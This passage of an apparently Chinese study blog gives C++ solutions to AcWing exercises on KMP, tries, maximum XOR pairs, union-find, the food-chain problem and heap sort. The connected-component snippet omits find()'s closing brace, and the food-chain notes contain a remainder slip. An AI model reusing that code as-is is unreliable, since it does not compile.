class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>, M = <span class="number">1000010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> ne[N];</span><br><span class="line"><span class="type">char</span> s[M], p[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; p + <span class="number">1</span> &gt;&gt; m &gt;&gt; s + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= n; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (j &amp;&amp; p[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="keyword">if</span> (p[i] == p[j + <span class="number">1</span>]) j ++ ;</span><br><span class="line">        ne[i] = j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (j &amp;&amp; s[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="keyword">if</span> (s[i] == p[j + <span class="number">1</span>]) j ++ ;</span><br><span class="line">        <span class="keyword">if</span> (j == n)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i - n);</span><br><span class="line">            j = ne[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Trie树-前缀树或字典树"><a href="#Trie树-前缀树或字典树" class="headerlink" title="Trie树(前缀树或字典树)"></a>Trie树(前缀树或字典树)</h3><p>高效存储查找字符串</p><h3 id="835-Trie字符串统计"><a href="#835-Trie字符串统计" class="headerlink" title="835. Trie字符串统计"></a>835. Trie字符串统计</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240724164829190.png" alt="image-20240724164829190"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"><span class="comment">//son[][]存储子节点的位置，分支最多26条；</span></span><br><span class="line"><span class="comment">//cnt[]存储以某节点结尾的字符串个数（同时也起标记作用）</span></span><br><span class="line"><span class="comment">//idx表示当前要插入的节点是第几个,每创建一个节点值+1</span></span><br><span class="line"><span class="type">int</span> son[N][<span class="number">32</span>], cnt[N], idx;</span><br><span class="line"><span class="type">char</span> str[N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">char</span> * str)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; str[i]; i++)&#123;</span><br><span class="line">        <span class="type">int</span> u = str[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!son[p][u]) son[p][u] = ++idx;</span><br><span class="line">        p = son[p][u];</span><br><span class="line">    &#125;</span><br><span class="line">    cnt[p]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">char</span> *str)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; str[i]; i++)&#123;</span><br><span class="line">        <span class="type">int</span> u = str[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!son[p][u]) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        p = son[p][u];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt[p];</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    cin &gt;&gt; m;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> op[<span class="number">2</span>];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s%s&quot;</span>, op, str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(*op == <span class="string">&#x27;I&#x27;</span>) <span class="built_in">insert</span>(str);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">query</span>(str));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="143-最大异或对"><a href="#143-最大异或对" class="headerlink" title="143. 最大异或对"></a>143. 最大异或对</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240724172351797.png" alt="image-20240724172351797"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span> son[N*<span class="number">31</span>][<span class="number">2</span>], idx,n,a[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">30</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> u = x &gt;&gt; i &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (!son[p][u])</span><br><span class="line">      son[p][u] = ++idx;</span><br><span class="line">    p = son[p][u];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">query</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> p = <span class="number">0</span>,res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">30</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> u = x &gt;&gt; i &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (son[p][!u])</span><br><span class="line">    &#123;</span><br><span class="line">      p = son[p][!u];</span><br><span class="line">      res = res * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      p = son[p][u];</span><br><span class="line">      res = res * <span class="number">2</span><span class="number">+0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    cin &gt;&gt; a[i];</span><br><span class="line">    <span class="built_in">insert</span>(a[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    res = <span class="built_in">max</span>(res, <span class="built_in">query</span>(a[i]));</span><br><span class="line">  &#125;</span><br><span class="line">  cout &lt;&lt; res;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h3><ul><li>将含有两个元素的两个集合合并</li><li>询问两个元素是否在一个集合中</li></ul><p>优化：路径压缩</p><h3 id="836-合并集合"><a href="#836-合并集合" class="headerlink" title="836. 合并集合"></a>836. 合并集合</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100050</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> p[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (p[x] != x)</span><br><span class="line">    p[x] =<span class="built_in">find</span>(p[x]);<span class="comment">//路径压缩</span></span><br><span class="line">  <span class="keyword">return</span> p[x];<span class="comment">//返回头节点</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    p[i] = i;<span class="comment">//将每个元素放入一个堆</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    <span class="type">char</span> op[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%d%d&quot;</span>, op, &amp;a, &amp;b);</span><br><span class="line">    <span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">      p[<span class="built_in">find</span>(a)] = <span class="built_in">find</span>(b);<span class="comment">//将a的头节点插入b</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">find</span>(a) == <span class="built_in">find</span>(b))</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Yes&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="837-连通块中点的数量"><a href="#837-连通块中点的数量" class="headerlink" title="837. 连通块中点的数量"></a>837. 连通块中点的数量</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240724201051041.png" alt="image-20240724201051041"></p><p>我们只需要再维持一个点的数量的数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1000050</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> p[N], siz[N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p[x] != x)   p[x] = <span class="built_in">find</span>(p[x]);</span><br><span class="line">    <span class="keyword">return</span> p[x];    <span class="comment">//p[x]已经被更新</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)  </span><br><span class="line">    &#123;</span><br><span class="line">        p[i] = i;</span><br><span class="line">        siz[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(m--)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> op[<span class="number">5</span>];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, op);</span><br><span class="line">        <span class="type">int</span> a, b;</span><br><span class="line">        <span class="keyword">if</span>(op[<span class="number">0</span>] == <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">find</span>(a) == <span class="built_in">find</span>(b)) <span class="keyword">continue</span>;<span class="comment">//同一连通图内点相连直接continue</span></span><br><span class="line">            siz[<span class="built_in">find</span>(b)] += siz[<span class="built_in">find</span>(a)];</span><br><span class="line">            p[<span class="built_in">find</span>(a)] = <span class="built_in">find</span>(b);</span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(op[<span class="number">1</span>] == <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, siz[<span class="built_in">find</span>(a)]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">find</span>(a) == <span class="built_in">find</span>(b))  <span class="built_in">puts</span>(<span class="string">&quot;Yes&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="240-食物链"><a href="#240-食物链" class="headerlink" title="240. 食物链"></a>240. 食物链</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240724231024216.png" alt="image-20240724231024216"></p><ul><li>余1可以吃根节点</li><li>余2可以被根节点吃</li><li>余3与根节点同类</li></ul><p>//TODO</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">5</span> * <span class="number">1e4</span> + <span class="number">10</span>; <span class="comment">// 定义最大节点数</span></span><br><span class="line"><span class="type">int</span> n, m; <span class="comment">// n表示节点数，m表示操作数</span></span><br><span class="line"><span class="type">int</span> p[N], d[N]; <span class="comment">// p数组存储每个节点的父节点，d数组存储每个节点到其父节点的距离</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找函数，带路径压缩和距离更新</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p[x] != x) &#123;</span><br><span class="line">        <span class="type">int</span> t = <span class="built_in">find</span>(p[x]); <span class="comment">// t暂时存储x的父节点的根节点</span></span><br><span class="line">        d[x] += d[p[x]]; <span class="comment">// 更新x到根节点的距离</span></span><br><span class="line">        p[x] = t; <span class="comment">// 路径压缩</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p[x]; <span class="comment">// 返回根节点</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="comment">// 初始化，每个节点的父节点为其自身</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        p[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>; <span class="comment">// 记录不合法操作的次数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">        <span class="type">int</span> r, x, y;</span><br><span class="line">        cin &gt;&gt; r &gt;&gt; x &gt;&gt; y;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查输入是否合法</span></span><br><span class="line">        <span class="keyword">if</span> (x &gt; n || y &gt; n) &#123;</span><br><span class="line">            res++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> px = <span class="built_in">find</span>(x), py = <span class="built_in">find</span>(y);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 处理r == 1的情况</span></span><br><span class="line">            <span class="keyword">if</span> (r == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 如果x和y在同一个集合中且不满足距离关系，则计数加1</span></span><br><span class="line">                <span class="keyword">if</span> (px == py &amp;&amp; (d[x] - d[y]) % <span class="number">3</span>) &#123;</span><br><span class="line">                    res++;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (px != py) &#123;</span><br><span class="line">                    <span class="comment">// 合并两个集合，更新距离关系</span></span><br><span class="line">                    p[px] = py;</span><br><span class="line">                    d[px] = d[y] - d[x];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 处理r == 2的情况</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (r == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="comment">// 如果x和y在同一个集合中且不满足距离关系，则计数加1</span></span><br><span class="line">                <span class="keyword">if</span> (px == py &amp;&amp; (d[x] - d[y] - <span class="number">1</span>) % <span class="number">3</span>) &#123;</span><br><span class="line">                    res++;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (px != py) &#123;</span><br><span class="line">                    <span class="comment">// 合并两个集合，更新距离关系</span></span><br><span class="line">                    p[px] = py;</span><br><span class="line">                    d[px] = d[y] + <span class="number">1</span> - d[x];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; res; <span class="comment">// 输出不合法操作的次数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><ul><li>插入一个数</li><li>求当前集合最小值</li><li>删除最小值</li><li><p>删除或修改任意元素</p></li><li><p>1为根，左儿子，2x，右儿子2x+1</p></li></ul><h3 id="838-堆排序"><a href="#838-堆排序" class="headerlink" title="838. 堆排序"></a>838. 堆排序</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240724232212209.png" alt="image-20240724232212209"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n, m, siz;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> h[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">down</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> t = u;</span><br><span class="line">  <span class="keyword">if</span> (h[<span class="number">2</span> * u] &lt; h[t] &amp;&amp; <span class="number">2</span> * u &lt;= siz)</span><br><span class="line">    t = <span class="number">2</span> * u;</span><br><span class="line">  <span class="keyword">if</span> (h[<span class="number">2</span> * u + <span class="number">1</span>] &lt; h[t] &amp;&amp; (<span class="number">2</span> * u + <span class="number">1</span>) &lt;= siz)</span><br><span class="line">    t = <span class="number">2</span> * u + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (t != u) &#123;</span><br><span class="line">    <span class="built_in">swap</span>(h[t], h[u]);</span><br><span class="line">    <span class="comment">//别忘了递归</span></span><br><span class="line">    <span class="built_in">down</span>(t);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    cin &gt;&gt; h[i]; <span class="comment">//从1开始</span></span><br><span class="line"></span><br><span class="line">  siz = n; <span class="comment">// 将 siz 初始化为 n      要在down前初始化</span></span><br><span class="line"></span><br><span class="line">  <span 